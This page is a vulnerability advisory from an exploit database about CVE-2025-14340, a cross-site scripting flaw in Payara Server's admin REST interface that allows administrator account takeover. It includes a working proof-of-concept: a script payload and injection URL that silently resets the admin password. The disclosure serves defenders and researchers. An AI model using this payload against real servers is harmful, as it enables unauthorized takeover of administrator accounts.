---
title: Payara Server Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2026030035
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-26
fetch_date: 2026-03-27T04:26:44.071530
---

# Payara Server Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Payara Server Cross Site Scripting** **2026.03.26**  Credit:  **[DeepSecurity Research](https://cxsecurity.com/author/DeepSecurity%2BResearch/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-14340](https://cxsecurity.com/cveshow/CVE-2025-14340/ "Click to see CVE-2025-14340")**  CWE: **N/A** | |

# XSS to Admin account takeover (CVE-2025-14340)
A Cross-Site Scripting vulnerability in Payara’s Administration Rest Interface, allows execution
of attacker-controlled JavaScript leading to admin account take over. Because of:
1. The panel uses HTTP Basic Auth (credentials are sent automatically by the browser for same-origin requests).
2. The change-admin-password endpoint does not require the current password to update a user’s password.
3. The change-admin-password form does not have CSRF protection.
4. An injected script using the XSS in `/management/domain/version` can POST to `/management/domain/change-admin-password` and set an attacker-chosen password for any target account — resulting in administrator account takeover.
#### Proof of Concept
URL:
`https://panel.example.com:4848/management/domain/version?<PAYLOAD>`
PAYLOAD:
```
<script>
fetch('/management/domain/change-admin-password', {
method: 'POST',
headers: {
'X-Requested-By': 'GlassFish REST HTML interface',
'Accept': 'text/html',
'Content-Type': 'application/x-www-form-urlencoded'
},
body:
'id=admin&newpassword=P1234&password=P1234&\_\_remove\_empty\_entries\_\_=true&=chang
e-admin-password'
});
</script>
```
## Legal
AUTHORIZED USE ONLY. DeepSecurity Perú does not endorse unauthorized access and takes no responsibility for any misuse of the information provided.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030035)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top